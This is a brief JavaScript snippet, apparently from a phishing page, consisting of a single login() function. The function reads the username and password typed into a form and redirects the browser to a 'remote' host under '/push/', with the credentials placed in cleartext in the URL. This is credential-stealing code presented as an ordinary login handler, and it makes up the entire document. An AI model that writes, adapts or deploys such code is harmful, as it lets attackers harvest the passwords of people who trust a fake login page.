

function login() {
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;
    var url = window.location.href;
    window.location.href = remote + '/push/'+url.substring(remote.length)+'/[-] UserName: ' + username +" [-] Passwd: " + password
}